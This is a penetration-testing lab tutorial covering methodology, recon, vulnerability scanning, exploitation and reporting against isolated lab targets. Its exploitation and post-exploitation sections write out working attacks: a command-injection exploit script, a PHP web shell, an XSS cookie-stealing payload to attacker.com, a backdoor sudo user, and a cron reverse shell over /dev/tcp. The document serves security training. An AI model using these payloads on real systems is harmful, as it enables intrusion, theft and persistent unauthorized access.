# Penetration Testing Lab

## Objective
Learn the methodology and techniques used in professional penetration testing, following industry standards and ethical guidelines.

## Prerequisites
- Understanding of networking and web applications
- Familiarity with Linux command line
- Basic scripting knowledge
- Written authorization for any testing

## Lab Overview
In this lab, you will:
1. Follow penetration testing methodology
2. Perform reconnaissance and information gathering
3. Conduct vulnerability assessment
4. Exploit identified vulnerabilities
5. Document findings professionally

## Part 1: Penetration Testing Methodology

### Exercise 1.1: Understanding the Phases
The standard penetration testing methodology includes:

1. **Pre-engagement**: Scope, rules of engagement, authorization
2. **Reconnaissance**: Information gathering
3. **Scanning**: Network and vulnerability scanning
4. **Exploitation**: Gaining access
5. **Post-exploitation**: Maintaining access, pivoting
6. **Reporting**: Documentation and remediation

### Exercise 1.2: Setting Up the Lab Environment
```bash
# Create isolated testing environment
# WARNING: Only test on systems you own or have written permission to test

# Set up target VMs (e.g., Metasploitable, DVWA)
# Configure Kali Linux as attack machine
# Ensure network isolation

# Document your lab setup
cat > lab_setup.txt << EOF
Attack Machine: Kali Linux (192.168.1.100)
Target 1: Metasploitable2 (192.168.1.101)
Target 2: DVWA (192.168.1.102)
Network: Isolated lab network
Authorization: Lab environment only
EOF
```

## Part 2: Reconnaissance

### Exercise 2.1: Passive Information Gathering
```bash
# OSINT (Open Source Intelligence)
# Domain information
whois target.com
nslookup target.com
dig target.com ANY

# DNS enumeration
dnsrecon -d target.com
dnsenum target.com

# Google dorking
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com ext:sql

# Shodan search
shodan search hostname:target.com

# Social media reconnaissance
# LinkedIn, Twitter, Facebook for employee information
```

### Exercise 2.2: Active Information Gathering
```bash
# Network mapping
nmap -sn 192.168.1.0/24  # Host discovery

# Port scanning
nmap -sS -sV -O 192.168.1.101  # SYN scan with version and OS detection

# Service enumeration
nmap -sC -sV -p- 192.168.1.101  # All ports with default scripts

# Web application discovery
dirb http://192.168.1.102
gobuster dir -u http://192.168.1.102 -w /usr/share/wordlists/dirb/common.txt

# Technology stack identification
whatweb http://192.168.1.102
wappalyzer http://192.168.1.102
```

## Part 3: Vulnerability Assessment

### Exercise 3.1: Automated Vulnerability Scanning
```bash
# Nessus scan (requires license)
# 1. Configure scan policy
# 2. Add targets
# 3. Run credentialed/uncredentialed scan
# 4. Review results

# OpenVAS
sudo gvm-start
# Access web interface
# Configure and run scan

# Nikto web scanner
nikto -h http://192.168.1.102

# SQLMap for SQL injection
sqlmap -u "http://192.168.1.102/page.php?id=1" --batch
```

### Exercise 3.2: Manual Vulnerability Testing
```python
#!/usr/bin/env python3
# Custom vulnerability checker

import requests
import re

class VulnChecker:
    def __init__(self, target):
        self.target = target
        self.vulnerabilities = []
    
    def check_headers(self):
        """Check security headers"""
        r = requests.get(self.target)
        headers = r.headers
        
        # Check for missing security headers
        security_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'X-XSS-Protection'
        ]
        
        for header in security_headers:
            if header not in headers:
                self.vulnerabilities.append(f"Missing header: {header}")
    
    def check_ssl(self):
        """Check SSL/TLS configuration"""
        import ssl
        import socket
        
        hostname = self.target.replace('https://', '').replace('http://', '')
        context = ssl.create_default_context()
        
        try:
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    # Check certificate validity
                    # Check cipher strength
                    # Check protocol version
        except Exception as e:
            self.vulnerabilities.append(f"SSL/TLS issue: {str(e)}")
    
    def check_common_files(self):
        """Check for exposed sensitive files"""
        common_files = [
            '.git/config',
            '.env',
            'phpinfo.php',
            '.htaccess',
            'web.config',
            'robots.txt',
            'sitemap.xml'
        ]
        
        for file in common_files:
            url = f"{self.target}/{file}"
            r = requests.get(url)
            if r.status_code == 200:
                self.vulnerabilities.append(f"Exposed file: {file}")
    
    def generate_report(self):
        print(f"Vulnerability Assessment for {self.target}")
        print("=" * 50)
        for vuln in self.vulnerabilities:
            print(f"[!] {vuln}")

# Usage
checker = VulnChecker("http://192.168.1.102")
checker.check_headers()
checker.check_common_files()
checker.generate_report()
```

## Part 4: Exploitation

### Exercise 4.1: Metasploit Framework
```bash
# Start Metasploit
sudo msfconsole

# Search for exploits
search type:exploit platform:linux apache

# Use an exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.168.1.101
set TARGETURI /cgi-bin/test.cgi
exploit

# Post-exploitation
sessions -l
sessions -i 1
sysinfo
getuid
```

### Exercise 4.2: Manual Exploitation
```python
#!/usr/bin/env python3
# Custom exploit for command injection vulnerability

import requests
import sys

def exploit_command_injection(target, command):
    # Vulnerable parameter
    payload = f"; {command}"
    
    # Send exploit
    data = {
        'ip': f'127.0.0.1{payload}'
    }
    
    r = requests.post(f"{target}/ping.php", data=data)
    
    # Extract command output
    output = r.text.split('<pre>')[1].split('</pre>')[0]
    return output

# Usage
if len(sys.argv) != 3:
    print("Usage: exploit.py <target> <command>")
    sys.exit(1)

target = sys.argv[1]
command = sys.argv[2]

result = exploit_command_injection(target, command)
print(result)
```

### Exercise 4.3: Web Application Exploitation
```bash
# SQL Injection exploitation
# Manual extraction
curl "http://192.168.1.102/sqli.php?id=1' UNION SELECT 1,database(),3--"

# File upload exploitation
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload and access
# http://192.168.1.102/uploads/shell.php?cmd=whoami

# XSS exploitation
# Steal cookies
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# Local File Inclusion
curl "http://192.168.1.102/lfi.php?file=../../../../etc/passwd"
```

## Part 5: Post-Exploitation

### Exercise 5.1: Maintaining Access
```bash
# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor

# Install persistence
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" > /tmp/cron
crontab /tmp/cron

# SSH key
ssh-keygen -t rsa -N "" -f backdoor_key
cat backdoor_key.pub >> ~/.ssh/authorized_keys
```

### Exercise 5.2: Privilege Escalation
```bash
# Enumeration scripts
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Manual enumeration
# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel 3.13

# Sudo misconfiguration
sudo -l
```

### Exercise 5.3: Lateral Movement
```python
#!/usr/bin/env python3
# Network pivoting script

import subprocess
import ipaddress

def discover_internal_network(interface):
    """Discover internal network from compromised host"""
    # Get network information
    cmd = f"ip addr show {interface} | grep inet | awk '{{print $2}}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    network = ipaddress.ip_network(result.stdout.strip(), strict=False)
    
    # Scan internal network
    live_hosts = []
    for ip in network.hosts():
        cmd = f"ping -c 1 -W 1 {ip}"
        result = subprocess.run(cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            live_hosts.append(str(ip))
    
    return live_hosts

# Port forwarding for pivoting
def setup_port_forward(local_port, remote_host, remote_port):
    cmd = f"ssh -L {local_port}:{remote_host}:{remote_port} -N -f user@pivot-host"
    subprocess.run(cmd, shell=True)
```

## Part 6: Reporting

### Exercise 6.1: Report Template
```markdown
# Penetration Test Report

## Executive Summary
- Engagement dates: [Start] - [End]
- Scope: [IP ranges, applications]
- Methodology: PTES, OWASP
- High-level findings

## Risk Summary
| Risk Level | Count |
|------------|-------|
| Critical   | X     |
| High       | X     |
| Medium     | X     |
| Low        | X     |

## Detailed Findings

### Finding 1: SQL Injection in Login Form
**Risk**: Critical
**CVSS Score**: 9.8
**Description**: The login form is vulnerable to SQL injection...
**Impact**: Complete database compromise
**Proof of Concept**:
```
POST /login.php
username=admin' OR '1'='1'--&password=anything
```
**Remediation**: Use prepared statements

## Recommendations
1. Immediate actions
2. Short-term improvements
3. Long-term security program

## Appendices
- Tool output
- Screenshots
- Technical details
```

### Exercise 6.2: Automated Report Generation
```python
#!/usr/bin/env python3
# Report generator

import json
from datetime import datetime
import markdown

class PentestReport:
    def __init__(self, client, tester):
        self.client = client
        self.tester = tester
        self.findings = []
        self.date = datetime.now().strftime("%Y-%m-%d")
    
    def add_finding(self, title, risk, description, poc, remediation):
        finding = {
            'title': title,
            'risk': risk,
            'description': description,
            'poc': poc,
            'remediation': remediation,
            'id': f"VULN-{len(self.findings)+1:03d}"
        }
        self.findings.append(finding)
    
    def generate_html_report(self):
        report_md = f"""
# Penetration Test Report

**Client**: {self.client}  
**Tester**: {self.tester}  
**Date**: {self.date}

## Executive Summary

This report contains the results of the penetration test conducted...

## Findings

"""
        for finding in self.findings:
            report_md += f"""
### {finding['id']}: {finding['title']}

**Risk Level**: {finding['risk']}

**Description**: {finding['description']}

**Proof of Concept**:
```
{finding['poc']}
```

**Remediation**: {finding['remediation']}

---
"""
        
        # Convert to HTML
        html = markdown.markdown(report_md, extensions=['fenced_code'])
        
        with open(f"pentest_report_{self.date}.html", 'w') as f:
            f.write(f"""
<!DOCTYPE html>
<html>
<head>
    <title>Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        code {{ background: #f4f4f4; padding: 2px 4px; }}
        pre {{ background: #f4f4f4; padding: 10px; overflow-x: auto; }}
    </style>
</head>
<body>
{html}
</body>
</html>
""")

# Usage
report = PentestReport("ACME Corp", "Security Tester")
report.add_finding(
    "SQL Injection in Login",
    "Critical",
    "The login form is vulnerable to SQL injection attacks.",
    "username=admin' OR '1'='1'--",
    "Implement prepared statements and input validation."
)
report.generate_html_report()
```

## Lab Challenges

### Challenge 1: Full Penetration Test
Conduct a complete penetration test on the lab environment:
1. Perform thorough reconnaissance
2. Identify all vulnerabilities
3. Exploit at least 3 different vulnerability types
4. Achieve privilege escalation
5. Write professional report

### Challenge 2: Web Application Assessment
Focus on web application testing:
1. Map the entire application
2. Test for OWASP Top 10
3. Chain vulnerabilities for maximum impact
4. Demonstrate business impact

### Challenge 3: Red Team Exercise
Simulate an advanced persistent threat:
1. Initial compromise via phishing
2. Establish persistence
3. Lateral movement
4. Data exfiltration
5. Cover tracks

## Best Practices

### Ethical Guidelines:
1. **Always have written authorization**
2. **Stay within scope**
3. **Minimize impact on production**
4. **Protect client data**
5. **Report findings immediately**
6. **Maintain confidentiality**
7. **Follow responsible disclosure**

### Technical Best Practices:
- Document everything
- Take screenshots
- Save tool output
- Verify findings
- Test remediation
- Use encryption for reports
- Maintain chain of custody

## Conclusion
This lab covered:
- Penetration testing methodology
- Reconnaissance techniques
- Vulnerability assessment
- Exploitation methods
- Post-exploitation tactics
- Professional reporting

Remember: Penetration testing requires authorization and should only be performed ethically and legally.

## Additional Resources
- PTES (Penetration Testing Execution Standard)
- OWASP Testing Guide
- NIST SP 800-115
- SANS Penetration Testing 